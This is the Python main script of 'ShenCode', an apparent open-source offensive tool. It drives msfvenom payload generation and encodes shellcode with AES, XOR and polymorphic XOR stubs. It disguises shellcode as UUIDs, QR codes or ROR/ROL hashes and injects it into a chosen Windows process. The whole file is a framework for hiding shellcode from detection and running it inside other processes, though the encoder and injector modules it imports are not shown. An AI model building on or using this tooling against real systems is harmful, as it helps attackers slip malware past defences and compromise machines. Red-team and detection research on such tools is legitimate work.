import argparse
import os

import utils.arg as arg
from utils.helper import nstate as nstate
import utils.extract as extract
import utils.formatout as formatout
import utils.hashes as hashes
import utils.injection as injection
import utils.msf as msf
import encoder.aes as aes
import encoder.xorpoly as xorpoly
import encoder.xor as xor
import obfuscator.qrcode as qrcode
import obfuscator.rolhash as rolhash
import obfuscator.uuid as uuid

Version = '0.5.1'

# make sure your metasploit binary folder is in your PATH variable
if os.name == 'nt':
  msfvenom_path = "msfvenom.bat"
elif os.name == 'posix':
  msfvenom_path = 'msfvenom'
  
def main(command_line=None):
  print(f"{nstate.HEADER}")
  print(f"  _______   __                      _______              __         ")
  print(f" |   _   | |  |--. .-----. .-----. |   _   | .-----. .--|  | .-----.")
  print(f" |   1___| |     | |  -__| |     | |.  1___| |  _  | |  _  | |  -__|")
  print(f" |____   | |__|__| |_____| |__|__| |.  |___  |_____| |_____| |_____|")
  print(f" |:  1   |                         |:  1   |                        ")
  print(f" |::.. . |                         |::.. . |                        ")
  print(f" `-------\'                         `-------\'                      ")
  print(f"Version {Version} by psycore8 -{nstate.ENDC} {nstate.LINK}https://www.nosociety.de{nstate.ENDC}") 

  ##########################
  ### BEGIN INIT SECTION ###
  ##########################

  arg.CreateMainParser()
  aes.aes_encoder.init()
  extract.extract_shellcode.init()
  formatout.format.init()
  if os.name == 'nt':
    injection.inject.init()
  msf.msfvenom.init()
  qrcode.qrcode_obfuscator.init()
  if os.name == 'nt':
    rolhash.ror2rol_obfuscator.init()
  uuid.uuid_obfuscator.init()
  xorpoly.xor.init()
  xor.xor_encoder.init()
  arguments = arg.ParseArgs(command_line)

  ##########################
  #### END INIT SECTION ####
  ##########################
  

  # MAIN

  if arguments.command == 'msfvenom':
    print(f"{nstate.OKBLUE} create payload")
    cs = msf.msfvenom
    cs.CreateShellcodeEx(msfvenom_path, arguments.cmd)

  elif arguments.command == 'xorpoly':
    xorpoly.xor.Input_File = arguments.input
    xorpoly.xor.XOR_Key = arguments.key
    xorpoly.xor.Output_File = arguments.output
    xorpoly.xor.Template_File = 'tpl\\xor-stub.tpl'
    print(f"{nstate.OKBLUE} Reading shellcode")
    try: 
      with open(arguments.input, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
      print(f"{nstate.FAIL} File not found or cannot be opened.")
      exit()
    modified_shellcode = xor.xor_encoder.xor_crypt_bytes(shellcode, int(arguments.key))
    outputfile = 'xor.tmp'
    with open(outputfile, 'wb') as file:
      file.write(modified_shellcode)
    path = outputfile
    cf = os.path.isfile(path)
    if cf == True:
      print(f"{nstate.OKGREEN} XOR encoded shellcode created in {outputfile}")
    else:
      print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
      exit()
    xorpoly.xor.Input_File = outputfile
    xorpoly.xor.process()

  elif arguments.command == 'aesenc':
    if arguments.debug:
      aes.aes_encoder.debug()
    else:
      print(f'{nstate.OKBLUE} [AES] Module')
      aes.aes_encoder.Input_File = arguments.input
      aes.aes_encoder.Output_File = arguments.output
      PasswordBytes = arguments.key
      aes.aes_encoder.Password = PasswordBytes.encode('utf-8')
      if arguments.mode == 'encode':
        aes.aes_encoder.encode()
        sha1_input = hashes.sha1.calculate_sha1(aes.aes_encoder.Input_File)
        sha1_output = hashes.sha1.calculate_sha1(aes.aes_encoder.Output_File)
        print(f'{nstate.OKGREEN} [AES-ENC] Input: {aes.aes_encoder.Input_File} - {sha1_input}')
        print(f'{nstate.OKGREEN} [AES-ENC] Output: {aes.aes_encoder.Output_File} - {sha1_output}')
      elif arguments.mode == 'decode':
        aes.aes_encoder.decode()
        #aes.aes_encoder.encode()
        sha1_input = hashes.sha1.calculate_sha1(aes.aes_encoder.Input_File)
        sha1_output = hashes.sha1.calculate_sha1(aes.aes_encoder.Output_File)
        print(f'{nstate.OKGREEN} [AES-DEC] Input: {aes.aes_encoder.Input_File} - {sha1_input}')
        print(f'{nstate.OKGREEN} [AES-DEC] Output: {aes.aes_encoder.Output_File} - {sha1_output}')

  elif arguments.command == 'uuid':
      short_fn = os.path.basename(arguments.input)
      ou = uuid.uuid_obfuscator
      print(f"{nstate.OKBLUE} try to open file")
      if ou.open_file(arguments.input):
        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
      else:
        print(f"{nstate.FAIL} file not found, exit")
      print(f"{nstate.OKBLUE} try to generate UUIDs")  
      print(ou.CreateVar())

  elif arguments.command == 'formatout':
      filename = arguments.input
      OutputFormat = arguments.syntax
      lines = arguments.lines
      print(filename)
      print(f"{nstate.OKBLUE} processing shellcode format...")
      fo = formatout.format
      scFormat = fo.process(filename,OutputFormat,lines)
      print(scFormat)
      if arguments.write:
        fo.FileManipulation.WriteToTemplate(arguments.write, scFormat)
        print(f"{nstate.OKGREEN} Output written in buf {arguments.write}")
      print(f"{nstate.OKGREEN} DONE!")

  elif arguments.command == 'ror2rol':
      ror_key = int(arguments.key)
      if (ror_key < 32) or (ror_key > 255):
        print(f"{nstate.FAIL} Key must be between 33 and 255")
        exit()
      rolhash.ror2rol_obfuscator.process(arguments.input, arguments.output, arguments.key)

  elif arguments.command == 'xorenc':
      print(f"{nstate.OKBLUE} Reading shellcode")
      try: 
        with open(arguments.input, "rb") as file:
          shellcode = file.read()
      except FileNotFoundError:
          print(f"{nstate.FAIL} File not found or cannot be opened.")
          exit()
      modified_shellcode = xor.xor_encoder.xor_crypt_bytes(shellcode, int(arguments.key))
      outputfile = arguments.output
      with open(outputfile, 'wb') as file:
        file.write(modified_shellcode)
      path = outputfile
      cf = os.path.isfile(path)
      if cf == True:
        print(f"{nstate.OKGREEN} XOR encoded shellcode created in {outputfile}")
      else:
        print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
        exit()

  elif arguments.command == 'inject':
    print(f"{nstate.OKBLUE} Reading shellcode")
    filename = arguments.input
    try: 
      with open(filename, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
        print(f"{nstate.FAIL} File not found or cannot be opened.")
        exit()
    inject = injection.inject
    inject.Shellcode = shellcode
    inject.StartProcess = arguments.start
    inject.Target_Process = arguments.process
    inject.start_injection()

  elif arguments.command == 'extract':
    extract.extract_shellcode.process(arguments.input, arguments.output, arguments.first_byte, arguments.last_byte)

  elif arguments.version:
    print(f'ShenCode {Version}')

if __name__ == "__main__":
  main()
